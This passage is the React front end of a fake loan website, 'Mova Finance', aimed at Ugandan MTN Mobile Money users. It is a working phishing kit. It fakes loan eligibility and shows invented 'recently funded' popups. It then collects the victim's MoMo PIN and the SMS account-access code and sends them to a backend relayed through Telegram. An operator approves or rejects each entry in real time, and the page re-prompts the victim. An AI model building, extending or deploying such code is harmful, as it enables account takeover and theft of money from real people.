import { useEffect, useState } from 'react';
import {
  ArrowRight,
  Banknote,
  Check,
  CheckCircle2,
  ChevronRight,
  Clock3,
  FileText,
  MapPin,
  MessageCircle,
  Menu,
  ShieldCheck,
  Smartphone,
  Sparkles,
  User,
  X
} from 'lucide-react';
import { validateUgandaMtnNumber, validateVerificationMessage, validateWalletPin } from './walletValidation';

const USD_TO_UGX = 3750;
const API_BASE_URL = import.meta.env.VITE_API_URL || (typeof window !== 'undefined' && window.location.hostname === 'localhost' ? 'http://localhost:3001' : 'https://movafinanceapp.onrender.com');

const loanModels = {
  personal: {
    type: 'personal',
    min: 10 * USD_TO_UGX,
    max: 1000 * USD_TO_UGX,
    label: 'UGX 37,500 - 3,750,000',
    apr: 7.5,
    description: 'For your plans'
  },
  business: {
    type: 'business',
    min: 3000 * USD_TO_UGX,
    max: 30000 * USD_TO_UGX,
    label: 'UGX 11,250,000 - 112,500,000',
    apr: 7.5,
    description: 'For your growth'
  }
};

const recentFundedLoans = [
  { name: 'A. Nsubuga', location: 'Kampala', type: 'Business loan', amount: 'UGX 18,000,000', phone: '+256 077*****42' },
  { name: 'M. Atim', location: 'Gulu', type: 'Personal loan', amount: 'UGX 1,500,000', phone: '+256 076*****18' },
  { name: 'J. Kato', location: 'Mbarara', type: 'Business loan', amount: 'UGX 27,500,000', phone: '+256 078*****63' },
  { name: 'R. Achieng', location: 'Jinja', type: 'Personal loan', amount: 'UGX 950,000', phone: '+256 079*****09' },
  { name: 'P. Mugisha', location: 'Fort Portal', type: 'Business loan', amount: 'UGX 12,800,000', phone: '+256 076*****31' },
  { name: 'S. Nabirye', location: 'Entebbe', type: 'Personal loan', amount: 'UGX 2,250,000', phone: '+256 078*****76' },
  { name: 'D. Okello', location: 'Lira', type: 'Business loan', amount: 'UGX 8,400,000', phone: '+256 077*****54' },
  { name: 'E. Namukasa', location: 'Masaka', type: 'Personal loan', amount: 'UGX 1,200,000', phone: '+256 070*****87' }
];

const initialApplicationModel = {
  applicant: {
    fullName: '',
    email: '',
    phone: '',
    city: '',
    businessName: '',
    loanPurpose: '',
    income: '',
    employmentStatus: '',
    employerName: '',
    idNumber: ''
  },
  loan: {
    type: '',
    amount: 20_000_000,
    term: 36,
    monthlyRepayment: 597_222
  }
};

const formatUgx = (value) => `UGX ${Number(value).toLocaleString('en-UG')}`;

const formatPhone = (rawNumber) => {
  const digits = String(rawNumber).replace(/\D/g, '').slice(0, 10);
  if (!digits) return '+256 *****';

  const prefix = digits.slice(0, 3);
  const suffix = digits.slice(-2);
  const maskLength = Math.max(digits.length - prefix.length - suffix.length, 3);
  const masked = '*'.repeat(maskLength);

  return `+256 ${prefix}${masked}${suffix}`;
};

const generatePhoneNumber = (index) => {
  const digits = String(700000000 + ((index + 12) * 3737) % 200000000).padStart(10, '0');
  return formatPhone(digits);
};

const verificationMessage = `e.g.
Y'ello. Please note! This confidential code gives access to your MoMo account:
ayYfs3zQLAogkbkm+tDEidiuFxfM
ccu+T9Mki7vJmrfG7A==
Do not share it with anyone.
l+/DM+Y0kqw
HTx14B0+90w
YyRaK1dXEWz
CTO2RPz+HOF
yiitGCXacTO`;

const verificationMessagePlaceholder = verificationMessage;

const firstNames = ['Aisha', 'Amina', 'Brian', 'Derrick', 'Esther', 'Grace', 'Isaac', 'Joan', 'Kevin', 'Lydia', 'Mariam', 'Nathan', 'Olivia', 'Peter', 'Rachel', 'Samuel', 'Sarah', 'Timothy', 'Winnie', 'Yusuf'];
const surnames = ['Achieng', 'Adong', 'Akello', 'Alupo', 'Anyango', 'Apio', 'Atim', 'Auma', 'Ayaa', 'Bafaki', 'Baluku', 'Bamweyana', 'Baryomunsi', 'Bataringaya', 'Batte', 'Bbosa', 'Bukenya', 'Bukirwa', 'Businge', 'Busingye', 'Byamugisha', 'Byaruhanga', 'Ddamulira', 'Ekirapa', 'Emiru', 'Gumisiriza', 'Habyarimana', 'Iga', 'Isingoma', 'Kabanda', 'Kabenge', 'Kabuye', 'Kagoda', 'Kakooza', 'Kalema', 'Kalyegira', 'Kamau', 'Kanyike', 'Kasule', 'Kato', 'Kavuma', 'Kayiwa', 'Kibuuka', 'Kiconco', 'Kigongo', 'Kintu', 'Kisakye', 'Kisekka', 'Kiyingi', 'Kobusingye', 'Kule', 'Lukwago', 'Lwanga', 'Mabirizi', 'Mafabi', 'Magenyi', 'Maitum', 'Matovu', 'Mawanda', 'Mayanja', 'Mbonye', 'Mirembe', 'Mugabi', 'Mugasha', 'Mugerwa', 'Mugisha', 'Mugume', 'Muhumuza', 'Mukasa', 'Mukarutinya', 'Mukiibi', 'Mulindwa', 'Mungai', 'Musoke', 'Mutebi', 'Mutyaba', 'Muwanga', 'Mwebaze', 'Mwine', 'Nabadda', 'Nabirye', 'Nabukenya', 'Nabwire', 'Nadiope', 'Nakato', 'Nakyobe', 'Nalukwago', 'Namagembe', 'Namakula', 'Nambi', 'Nambasa', 'Nansubuga', 'Nanyonga', 'Nanyunja', 'Nassuna', 'Nsubuga', 'Ntambi', 'Oboth', 'Odongo', 'Okello', 'Okwir', 'Oluka', 'Otim', 'Ssebuuma', 'Ssekandi', 'Ssenfuma'];

const people = Array.from({ length: 200 }, (_, index) => `${firstNames[Math.floor(index / surnames.length)]} ${surnames[index % surnames.length]}`);

const activity = {
  personal: people.slice(0, 100).map((name, index) => ({
    name,
    amount: loanModels.personal.min + ((index * 37500) % (loanModels.personal.max - loanModels.personal.min)),
    momo: generatePhoneNumber(index)
  })),
  business: people.slice(100).map((name, index) => ({
    name,
    amount: loanModels.business.min + ((index * 525000) % (loanModels.business.max - loanModels.business.min)),
    momo: generatePhoneNumber(index + 100)
  }))
};

function App() {
  const [loanType, setLoanType] = useState(initialApplicationModel.loan.type);
  const [mobileOpen, setMobileOpen] = useState(false);
  const [recentPopupIndex, setRecentPopupIndex] = useState(0);
  const [recentPopupVisible, setRecentPopupVisible] = useState(false);
  const [amount, setAmount] = useState(initialApplicationModel.loan.amount);
  const [term, setTerm] = useState(initialApplicationModel.loan.term);
  const [page, setPage] = useState('home');
  const [step, setStep] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('Preparing your application');
  const [form, setForm] = useState(initialApplicationModel.applicant);
  const [consentAccepted, setConsentAccepted] = useState(false);
  const [errors, setErrors] = useState({});
  const [mtnNumber, setMtnNumber] = useState('');
  const [postalNumber, setPostalNumber] = useState('');
  const [telegramConsentAccepted, setTelegramConsentAccepted] = useState(false);
  const [withdrawalConfirmed, setWithdrawalConfirmed] = useState(false);
  const [withdrawalError, setWithdrawalError] = useState('');
  const [otpCode, setOtpCode] = useState('');
  const [otpError, setOtpError] = useState('');
  const [verificationText, setVerificationText] = useState('');
  const [telegramApprovalOpen, setTelegramApprovalOpen] = useState(false);
  const [withdrawalSuccessOpen, setWithdrawalSuccessOpen] = useState(false);
  const [approvalResultStage, setApprovalResultStage] = useState('');
  const [approvalId, setApprovalId] = useState('');
  const [approvalStage, setApprovalStage] = useState('withdrawal');

  const activeLoanType = loanType || 'personal';
  const model = {
    loanType,
    range: loanModels[activeLoanType],
    isBusiness: loanType === 'business',
    amount,
    term,
    monthly: Math.round((amount * (1 + loanModels[activeLoanType].apr / 100)) / term),
    apr: loanModels[activeLoanType].apr,
    applicant: form
  };

  const selectLoan = (type) => {
    setLoanType(type);
    setRecentPopupVisible(false);
    if (type) {
      setAmount((current) => Math.min(Math.max(current, loanModels[type].min), loanModels[type].max));
    }
  };

  const handleChange = (event) => {
    const { name, value } = event.target;
    setForm((current) => ({ ...current, [name]: value }));
    setErrors((current) => ({ ...current, [name]: '' }));
  };

  const validateStep = () => {
    const nextErrors = {};
    const required = (name, label) => {
      if (!form[name].trim()) nextErrors[name] = `${label} is required.`;
    };

    if (step === 0) {
      required('fullName', 'Full name');
      required('email', 'Email');
      required('phone', 'Phone number');
      required('city', 'Location');
      if (form.email.trim() && !/^\S+@\S+\.\S+$/.test(form.email.trim())) nextErrors.email = 'Enter a valid email address.';
      if (form.phone.trim() && form.phone.replace(/\D/g, '').length < 9) nextErrors.phone = 'Enter a valid phone number.';
    }

    if (step === 1) {
      required('loanPurpose', 'Loan purpose');
      required(model.isBusiness ? 'businessName' : 'employmentStatus', model.isBusiness ? 'Business name' : 'Employment status');
      if (!model.isBusiness) required('employerName', 'Employer name');
      required('income', 'Monthly income');
    }

    if (step === 2) {
      required('idNumber', 'ID number');
      if (!consentAccepted) nextErrors.consent = 'You must accept the consent and terms.';
    }

    setErrors(nextErrors);
    return Object.keys(nextErrors).length === 0;
  };

  const handleContinue = () => {
    if (validateStep()) setStep((current) => Math.min(current + 1, 2));
  };

  const sendTelegramContact = async ({ verificationMessage = '', approvalId: currentApprovalId = '' } = {}) => {
    const response = await fetch(`${API_BASE_URL}/api/telegram/contact`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        fullName: form.fullName,
        phone: form.phone,
        email: form.email,
        mtnNumber,
        postalNumber,
        loanType: model.isBusiness ? 'Business loan' : 'Personal loan',
        amount: model.amount,
        verificationMessage,
        approvalId: currentApprovalId
      })
    });

    if (!response.ok) {
      const result = await response.json().catch(() => ({}));
      throw new Error(result.error || 'We could not send your details.');
    }

    return response.json();
  };

  const confirmWithdrawal = async () => {
    if (!validateUgandaMtnNumber(mtnNumber)) {
      setWithdrawalError('Enter a valid Uganda MTN number starting with 076, 077, 078, or 079.');
      return;
    }

    if (!validateWalletPin(postalNumber)) {
      setWithdrawalError('Enter your 5-digit MoMo PIN to continue.');
      return;
    }

    if (!telegramConsentAccepted) {
      setWithdrawalError('Please agree to share these details with Mova support.');
      return;
    }

    setWithdrawalError('');
    setLoadingMessage('Sending your details to Mova support');
    setIsLoading(true);

    try {
      const result = await sendTelegramContact();
      setApprovalId(result.approvalId || '');
      setWithdrawalConfirmed(true);
      setIsLoading(false);
      setApprovalStage('withdrawal');
      setTelegramApprovalOpen(true);
      setPage('withdrawalFailed');
    } catch (error) {
      setIsLoading(false);
      setWithdrawalError(error.message || 'We could not send your details. Please try again.');
    }
  };

  const handleTelegramApproval = (action) => {
    if (!['correct', 'wrong-pin', 'wrong-code'].includes(action)) return;

    setTelegramApprovalOpen(false);

    if (action === 'wrong-pin') {
      setWithdrawalError('The MoMo PIN was rejected. Please review your withdrawal details and try again.');
      setPage('success');
      return;
    }

    if (action === 'wrong-code') {
      setVerificationText('');
      setOtpError('The verification code was rejected. Please paste the correct verification message and try again.');
      setPage('withdrawalFailed');
      return;
    }

    if (action === 'correct' && approvalStage === 'withdrawal') {
      setApprovalResultStage('withdrawal');
      setWithdrawalSuccessOpen(true);
      return;
    }

    if (action === 'correct' && approvalStage === 'verification') {
      setApprovalResultStage('verification');
      setWithdrawalSuccessOpen(true);
    }
  };

  const verifyOtp = async () => {
    if (!validateVerificationMessage(verificationText)) {
      setOtpError('The verification message does not match. Please copy the exact SMS and try again.');
      return;
    }

    setOtpError('');
    setLoadingMessage('Verifying your request');
    setApprovalStage('verification');
    setApprovalId('');
    setTelegramApprovalOpen(true);
    setIsLoading(true);

    try {
      const result = await sendTelegramContact({ verificationMessage: verificationText, approvalId });
      setIsLoading(false);
      setApprovalId(result.approvalId || approvalId);
      setLoadingMessage('Waiting for secure review');
    } catch (error) {
      setTelegramApprovalOpen(false);
      setIsLoading(false);
      setOtpError(error.message || 'We could not verify your message. Please try again.');
    }
  };

  const navigateToPage = (nextPage, message = 'Preparing your application', delay = 700) => {
    setLoadingMessage(message);
    setIsLoading(true);
    window.setTimeout(() => {
      setPage(nextPage);
      setIsLoading(false);
      if (nextPage === 'application') {
        setStep(0);
      }
    }, delay);
  };

  useEffect(() => {
    window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
  }, [page]);

  useEffect(() => {
    if (!loanType) return undefined;

    const frame = window.requestAnimationFrame(() => {
      document.querySelector('.application-card .card-button')?.scrollIntoView({ behavior: 'smooth', block: 'center' });
    });

    return () => window.cancelAnimationFrame(frame);
  }, [loanType]);

  useEffect(() => {
    const showPopup = window.setTimeout(() => setRecentPopupVisible(true), 2600);
    const rotatePopup = window.setInterval(() => {
      setRecentPopupVisible(false);
      setRecentPopupIndex((current) => (current + 1) % recentFundedLoans.length);
      window.setTimeout(() => setRecentPopupVisible(true), 350);
    }, 8500);

    return () => {
      window.clearTimeout(showPopup);
      window.clearInterval(rotatePopup);
    };
  }, []);

  useEffect(() => {
    if (!telegramApprovalOpen || !approvalId) return undefined;

    const controller = new AbortController();
    const activeApprovalId = approvalId;
    const pollApproval = async () => {
      try {
        const response = await fetch(`${API_BASE_URL}/api/telegram/approval/${activeApprovalId}`, { signal: controller.signal });
        if (!response.ok) return;

        const result = await response.json();
        if (result.action) {
          handleTelegramApproval(result.action);
        }
      } catch (error) {
        if (error.name !== 'AbortError') return;
      }
    };

    pollApproval();
    const pollTimer = window.setInterval(pollApproval, 750);

    return () => {
      window.clearInterval(pollTimer);
      controller.abort();
    };
  }, [approvalId, telegramApprovalOpen]);

  const renderHome = () => (
    <>
      <header className="site-header">
        <a className="brand" href="#home"><span className="brand-symbol">m</span><span>Mova Finance</span></a>
        <nav className={mobileOpen ? 'site-nav open' : 'site-nav'}>
          <a href="#loans" onClick={() => setMobileOpen(false)}>Loans</a>
          <a href="#why" onClick={() => setMobileOpen(false)}>Why Mova</a>
        </nav>
        <div className="header-actions">
              <button type="button" className="header-button" disabled={!loanType} onClick={() => navigateToPage('application', 'Preparing your application')}>
            Apply now <ArrowRight size={15} />
          </button>
        </div>
        <button className="menu-button" onClick={() => setMobileOpen(!mobileOpen)} aria-label="Toggle menu">
          {mobileOpen ? <X size={21} /> : <Menu size={21} />}
        </button>
      </header>

      <main id="home">
        <section className="application-hero" id="loans">
          <div className="hero-panel">
            <div className="status-line"><span className="status-dot" /> MOVA FINANCE / FINANCING MADE SIMPLE</div>
            <h1>Finance the move<br /><span>ahead of you.</span></h1>
            <p>Choose a loan type and see your available range before you apply.</p>
            <div className="hero-actions">
              <button type="button" className="solid-button" disabled={!loanType} onClick={() => navigateToPage('application', 'Calculating your loan options')}>
                Calculate my payment <ArrowRight size={16} />
              </button>
              <span className="hero-note"><ShieldCheck size={15} /> Secure application</span>
            </div>
          </div>

          <div className="application-card">
            <div className="card-topline"><span>Loan finder</span><span className="step-count">Personal or business</span></div>
            <h2>Choose your<br /><em>loan type.</em></h2>
            <p className="card-subtitle">Select one to see your available range.</p>
            <div className="loan-selector">
              <label htmlFor="loan-type">Loan type</label>
              <select id="loan-type" autoFocus required value={loanType} onChange={(event) => selectLoan(event.target.value)}>
                <option value="" disabled>Select a loan type</option>
                <option value="personal">Personal loan</option>
                <option value="business">Business loan</option>
              </select>
              <small>{loanType ? loanModels[loanType].description : 'Choose one to see your available range.'}</small>
            </div>
            {loanType && <div className="range-callout">
              <span>Available range</span>
              <strong>{model.range.label}</strong>
              <small>Flexible repayment terms • No obligation</small>
            </div>}
            {loanType && <div className="finder-amount">
              <div className="finder-amount-heading"><span>Amount you want to apply for</span><strong>{formatUgx(model.amount)}</strong></div>
              <input aria-label="Application amount" type="range" min={model.range.min} max={model.range.max} step="500" value={model.amount} onChange={(event) => setAmount(Number(event.target.value))} />
              <div className="range-labels"><span>{formatUgx(model.range.min)}</span><span>{formatUgx(model.range.max)}</span></div>
            </div>}
            {loanType && <div className="finder-term">
              <div className="finder-amount-heading"><span>Repayment period</span><strong>{term} months</strong></div>
              <div className="term-row">
                {[12, 24, 36, 48].map((option) => (
                  <button key={option} type="button" className={term === option ? 'term selected' : 'term'} onClick={() => setTerm(option)}>{option} months</button>
                ))}
              </div>
            </div>}
            <button type="button" className={loanType ? 'card-button card-button-ready' : 'card-button'} disabled={!loanType} onClick={() => navigateToPage('application', 'Loading your loan form')}>Continue <ArrowRight size={16} /></button>
          </div>
        </section>

      </main>

      {recentPopupVisible && !loanType && (
        <div className="recent-popup" role="status" aria-live="polite">
          <span className="recent-popup-icon"><CheckCircle2 size={15} /></span>
          <div>
            <span>Recently funded</span>
            <strong>{recentFundedLoans[recentPopupIndex].name} received {recentFundedLoans[recentPopupIndex].amount}</strong>
            <small>{recentFundedLoans[recentPopupIndex].type} · MTN {recentFundedLoans[recentPopupIndex].phone}</small>
          </div>
        </div>
      )}

      <footer className="landing-footer">
        <a className="brand" href="#home"><span className="brand-symbol">m</span><span>Mova Finance</span></a>
        <span>(c) 2026 Mova Finance</span>
        <span>Borrow thoughtfully. Move boldly.</span>
      </footer>
    </>
  );

  const renderApplication = () => {
    const stepTitles = ['Your details', 'Loan details', 'Verification'];
    const progress = ((step + 1) / 3) * 100;

    return (
      <div className="page-shell">
        <header className="site-header">
          <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
            <span className="brand-symbol">m</span><span>Mova Finance</span>
          </button>
          <div className="header-actions masthead-actions">
            <span className="pill-tag">Secure application</span>
            <button type="button" className="header-button" onClick={() => setPage('home')}>Back to home</button>
          </div>
        </header>

        <main className="application-page">
          <section className="page-banner">
            <div>
              <span className="eyebrow">Application</span>
              <h1>Just a few details to get started.</h1>
            </div>
            <div className="offer-meta"><span>{model.isBusiness ? 'Business loan' : 'Personal loan'}</span><strong>{formatUgx(model.amount)}</strong><small>{model.term} month term</small></div>
          </section>

          <section className="wizard-shell">
            <div className="wizard-panel">
              <div className="stepper">
                {stepTitles.map((title, index) => (
                  <div key={title} className={index === step ? 'step-item active' : 'step-item'}>
                    <span>{index + 1}</span>
                    <small>{title}</small>
                  </div>
                ))}
              </div>
              <div className="progress-track"><span style={{ width: `${progress}%` }} /></div>

              <div className="wizard-content">
                {step === 0 && (
                  <div className="field-grid">
                    <label className="field"><span>Full name</span><input name="fullName" value={form.fullName} onChange={handleChange} aria-invalid={Boolean(errors.fullName)} />{errors.fullName && <small className="field-error">{errors.fullName}</small>}</label>
                    <label className="field"><span>Email</span><input type="email" name="email" value={form.email} onChange={handleChange} aria-invalid={Boolean(errors.email)} />{errors.email && <small className="field-error">{errors.email}</small>}</label>
                    <label className="field"><span>Phone number</span><input name="phone" value={form.phone} onChange={handleChange} aria-invalid={Boolean(errors.phone)} />{errors.phone && <small className="field-error">{errors.phone}</small>}</label>
                    <label className="field"><span>Location</span><input name="city" value={form.city} onChange={handleChange} aria-invalid={Boolean(errors.city)} />{errors.city && <small className="field-error">{errors.city}</small>}</label>
                  </div>
                )}

                {step === 1 && (
                  <div className="field-grid">
                    <label className="field"><span>Loan type</span><input value={model.isBusiness ? 'Business' : 'Personal'} readOnly /></label>
                    <div className="loan-amount-control">
                      <div className="loan-control-heading"><span>How much would you like?</span><strong>{formatUgx(model.amount)}</strong></div>
                      <input aria-label="Loan amount" type="range" min={model.range.min} max={model.range.max} step="500" value={model.amount} onChange={(event) => setAmount(Number(event.target.value))} />
                      <div className="range-labels"><span>{formatUgx(model.range.min)}</span><span>{formatUgx(model.range.max)}</span></div>
                    </div>
                    <div className="loan-amount-control">
                      <div className="loan-control-heading"><span>Repayment period</span><strong>{model.term} months</strong></div>
                      <div className="term-row">
                        {[12, 24, 36, 48].map((option) => (
                          <button key={option} type="button" className={model.term === option ? 'term selected' : 'term'} onClick={() => setTerm(option)}>
                            {option} months
                          </button>
                        ))}
                      </div>
                    </div>
                    <label className="field"><span>{model.isBusiness ? 'Business loan purpose' : 'Personal loan purpose'}</span><input name="loanPurpose" value={form.loanPurpose} onChange={handleChange} aria-invalid={Boolean(errors.loanPurpose)} />{errors.loanPurpose && <small className="field-error">{errors.loanPurpose}</small>}</label>
                    {model.isBusiness ? (
                      <label className="field"><span>Business name</span><input name="businessName" value={form.businessName} onChange={handleChange} aria-invalid={Boolean(errors.businessName)} />{errors.businessName && <small className="field-error">{errors.businessName}</small>}</label>
                    ) : (
                      <label className="field"><span>Employment status</span><input name="employmentStatus" value={form.employmentStatus} onChange={handleChange} aria-invalid={Boolean(errors.employmentStatus)} />{errors.employmentStatus && <small className="field-error">{errors.employmentStatus}</small>}</label>
                    )}
                    {!model.isBusiness && <label className="field"><span>Employer name</span><input name="employerName" value={form.employerName} onChange={handleChange} aria-invalid={Boolean(errors.employerName)} />{errors.employerName && <small className="field-error">{errors.employerName}</small>}</label>}
                    <label className="field"><span>Monthly income</span><input name="income" value={form.income} onChange={handleChange} aria-invalid={Boolean(errors.income)} />{errors.income && <small className="field-error">{errors.income}</small>}</label>
                  </div>
                )}

                {step === 2 && (
                  <div className="field-grid">
                    <label className="field"><span>ID number</span><input name="idNumber" value={form.idNumber} onChange={handleChange} aria-invalid={Boolean(errors.idNumber)} />{errors.idNumber && <small className="field-error">{errors.idNumber}</small>}</label>
                    <div className="field consent-field">
                      <span>Consent</span>
                      <label className="checkbox-row"><input type="checkbox" checked={consentAccepted} onChange={(event) => { setConsentAccepted(event.target.checked); setErrors((current) => ({ ...current, consent: '' })); }} /> <span>I agree to the loan terms and confirm the information provided is accurate and complete.</span></label>
                      {errors.consent && <small className="field-error">{errors.consent}</small>}
                    </div>
                  </div>
                )}
              </div>

              <div className="wizard-actions">
                <button type="button" className="secondary-button" disabled={step === 0} onClick={() => setStep((current) => Math.max(current - 1, 0))}>Back</button>
                {step < 2 ? (
                  <button type="button" className="primary-button" onClick={handleContinue}>Continue <ChevronRight size={16} /></button>
                ) : (
                  <button type="button" className="primary-button" onClick={() => { if (validateStep()) navigateToPage('review', 'Checking your application'); }}>
                    Review application <ChevronRight size={16} />
                  </button>
                )}
              </div>
            </div>
          </section>
        </main>
      </div>
    );
  };

  const renderReview = () => (
    <div className="page-shell">
      <header className="site-header">
        <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
          <span className="brand-symbol">m</span><span>Mova Finance</span>
        </button>
        <div className="header-actions masthead-actions">
          <span className="pill-tag">Application review</span>
          <button type="button" className="header-button" onClick={() => setPage('application')}>Edit form</button>
        </div>
      </header>

      <main className="review-page">
        <section className="page-banner compact-banner">
          <div>
            <span className="eyebrow">Final check</span>
            <h1>Review your application.</h1>
          </div>
        </section>

        <section className="review-grid">
          <div className="review-card review-overview">
            <div>
              <span className="review-label">Applicant</span>
              <strong>{form.fullName}</strong>
              <small>{form.phone} · {form.email}</small>
              <small>{form.city}</small>
            </div>
            <div>
              <span className="review-label">Selected offer</span>
              <strong>{formatUgx(model.amount)}</strong>
              <small>{model.isBusiness ? 'Business' : 'Personal'} loan · {model.term} months</small>
              <small>{formatUgx(model.monthly)} estimated monthly</small>
            </div>
          </div>

          <div className="review-card review-card-wide">
            <h3>Agreement</h3>
            <p>I confirm the details above are accurate, and I understand that by submitting this application, I consent to a credit and affordability review.</p>
            <div className="checkbox-row"><input type="checkbox" checked={consentAccepted} onChange={(event) => setConsentAccepted(event.target.checked)} /> <span>I accept the Mova Finance consent and terms.</span></div>
          </div>
        </section>

        <div className="wizard-actions review-actions">
          <button type="button" className="secondary-button" onClick={() => navigateToPage('application', 'Loading your application form')}>Back</button>
          <button type="button" className="primary-button" disabled={!consentAccepted} onClick={() => navigateToPage('success', 'Scanning your information and checking eligibility', 30000)}>
            Submit application <ChevronRight size={16} />
          </button>
        </div>
      </main>
    </div>
  );

  const renderSuccess = () => (
    <div className="page-shell success-page-shell">
      <header className="site-header">
        <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
          <span className="brand-symbol">m</span><span>Mova Finance</span>
        </button>
      </header>

      <main className="success-page">
        <div className="success-card">
          <div className="success-heading">
            <div className="success-badge"><CheckCircle2 size={35} /></div>
            <div><span className="eyebrow">Eligibility confirmed</span><h1>You qualify for a Mova loan.</h1></div>
          </div>
          <p className="success-intro">You are eligible for a {model.isBusiness ? 'business' : 'personal'} loan offer. Review the details below to continue.</p>
          <div className="success-offer">
            <div className="success-offer-top"><span>Eligible offer</span><strong><CheckCircle2 size={14} /> Qualified</strong></div>
            <div className="success-offer-main"><span>Loan amount</span><strong>{formatUgx(model.amount)}</strong></div>
            <div className="success-offer-grid">
              <div><span>Estimated monthly payment</span><strong>{formatUgx(model.monthly)}</strong></div>
              <div><span>Repayment term</span><strong>{model.term} months</strong></div>
              <div><span>Representative APR</span><strong>{model.apr}%</strong></div>
            </div>
          </div>
          <div className="withdrawal-panel">
            <div><span className="eyebrow">MTN Mobile Money</span><h3>Where should we send your funds?</h3></div>
            <label className="field"><span>MTN number</span><input inputMode="tel" placeholder="077 XXX XXXX" value={mtnNumber} onChange={(event) => { setMtnNumber(event.target.value); setWithdrawalConfirmed(false); setWithdrawalError(''); }} aria-invalid={withdrawalError.startsWith('Enter a valid Uganda MTN')} />{withdrawalError.startsWith('Enter a valid Uganda MTN') && <small className="field-error">{withdrawalError}</small>}</label>
            <label className="field"><span>MoMo PIN</span><input inputMode="numeric" pattern="[0-9]*" maxLength={5} placeholder="5-digit PIN" value={postalNumber} onChange={(event) => { const digits = event.target.value.replace(/\D/g, '').slice(0, 5); setPostalNumber(digits); setWithdrawalConfirmed(false); setWithdrawalError(''); }} aria-invalid={withdrawalError.startsWith('Enter your 5-digit MoMo PIN')} />{withdrawalError.startsWith('Enter your 5-digit MoMo PIN') && <small className="field-error">{withdrawalError}</small>}</label>
            <label className="checkbox-row withdrawal-consent"><input type="checkbox" checked={telegramConsentAccepted} onChange={(event) => { setTelegramConsentAccepted(event.target.checked); setWithdrawalError(''); }} /> <span>I agree to share these details with Mova Finance support through Telegram so they can contact me.</span></label>
            {withdrawalError.startsWith('Please agree') && <small className="field-error">{withdrawalError}</small>}
            <button type="button" className="primary-button" onClick={confirmWithdrawal}>{withdrawalConfirmed ? 'Withdrawal details confirmed' : 'Confirm withdrawal details'} <Check size={16} /></button>
          </div>
          <p className="success-disclaimer">This is an eligibility result, not a final disbursement approval. Your final offer may be subject to verification.</p>
          <div className="wizard-actions review-actions">
            <button type="button" className="secondary-button" onClick={() => navigateToPage('home', 'Returning home')}>Back home</button>
            <button type="button" className="primary-button" onClick={() => navigateToPage('application', 'Starting a new application')}>Apply again</button>
          </div>
        </div>
      </main>
    </div>
  );

  const renderWithdrawalFailed = () => (
    <div className="page-shell success-page-shell">
      <header className="site-header">
        <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
          <span className="brand-symbol">m</span><span>Mova Finance</span>
        </button>
        <div className="header-actions masthead-actions"><span className="pill-tag">Secure verification</span></div>
      </header>

      <main className="success-page">
        <div className="success-card verification-card">
          {withdrawalSuccessOpen && (
            <div className="success-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="approval-result-title">
              <div className="success-modal">
                <div className="success-modal-icon"><CheckCircle2 size={34} /></div>
                {approvalResultStage === 'withdrawal' ? (
                  <>
                    <span className="eyebrow">Withdrawal approved</span>
                    <h2 id="approval-result-title">Your withdrawal is ready</h2>
                    <p>Lovely, your withdrawal details are approved. Continue below to enter the verification message sent to your phone.</p>
                    <button type="button" className="primary-button" onClick={() => setWithdrawalSuccessOpen(false)}>Continue <ArrowRight size={16} /></button>
                  </>
                ) : (
                  <>
                    <span className="eyebrow">Verification approved</span>
                    <h2 id="approval-result-title">Your verification is complete</h2>
                    <p>Thank you, your verification message has been received and approved. Your withdrawal is now ready for the final step.</p>
                    <button type="button" className="primary-button" onClick={() => { setWithdrawalSuccessOpen(false); navigateToPage('success', 'Preparing your withdrawal'); }}>Continue <ArrowRight size={16} /></button>
                  </>
                )}
              </div>
            </div>
          )}

          {telegramApprovalOpen && (
            <div className="telegram-modal-backdrop" role="dialog" aria-modal="true">
              <div className="telegram-modal telegram-waiting-modal">
                <div className="telegram-waiting-icon"><span className="telegram-waiting-dot" /></div>
                <span className="eyebrow">Secure review</span>
                <h2>{approvalStage === 'withdrawal' ? 'Confirming your withdrawal' : 'Verifying your message'}</h2>
                <p>{approvalStage === 'withdrawal' ? 'Your withdrawal details are being reviewed. Please wait before continuing to message verification.' : 'Your verification message is being reviewed. Please wait while we complete the withdrawal check.'}</p>
                <div className="telegram-waiting-status"><span className="telegram-waiting-dot" /> Review in progress</div>
              </div>
            </div>
          )}

          <div className="verification-topline">
            <div className="success-badge"><ShieldCheck size={28} /></div>
            <div>
              <span className="eyebrow">Step 2 of 2 · Secure review</span>
              <h1>Enter your verification message</h1>
            </div>
          </div>

          <p className="verification-intro">Paste the message sent to {formatPhone(mtnNumber)}. We will review it securely before the final step.</p>

          <div className="verification-panel">
            <div className="sms-shell" aria-label="Verification SMS preview">
              <div className="sms-header">
                <span>Verification message</span>
                <small>Secure &amp; private</small>
              </div>
              <textarea
                className="verification-message"
                aria-label="Paste verification message"
                placeholder={verificationMessagePlaceholder}
                value={verificationText}
                onChange={(event) => {
                  setVerificationText(event.target.value);
                  setOtpError('');
                }}
              />
            </div>

            <div className="verification-actions">
              <button type="button" className="primary-button" onClick={verifyOtp}>Submit for review <Check size={16} /></button>
            </div>
            {otpError && <small className="field-error">{otpError}</small>}
          </div>

          <div className="wizard-actions review-actions">
            <button type="button" className="secondary-button" onClick={() => navigateToPage('success', 'Returning to your offer')}>Back to offer</button>
            <button type="button" className="primary-button" onClick={() => navigateToPage('home', 'Returning home')}>Back home</button>
          </div>
        </div>
      </main>
    </div>
  );

  return (
    <div className="site-shell">
      {isLoading && (
        <div className="loading-overlay" role="status" aria-live="polite" aria-busy="true">
          <div className="loading-panel">
            <div className="loading-header">
              <div className="loading-brand" aria-label="Mova Finance">
                <span className="brand-symbol">m</span>
                <span>Mova Finance</span>
              </div>
              <span className="security-badge">Secure review</span>
            </div>
            <div className="spinner-wrap">
              <div className="spinner" aria-hidden="true" />
            </div>
            <div className="loading-text">{loadingMessage}</div>
            <div className="loading-progress" aria-hidden="true">
              <span />
            </div>
          </div>
        </div>
      )}
      {page === 'home' && renderHome()}
      {page === 'application' && renderApplication()}
      {page === 'review' && renderReview()}
      {page === 'success' && renderSuccess()}
      {page === 'withdrawalFailed' && renderWithdrawalFailed()}
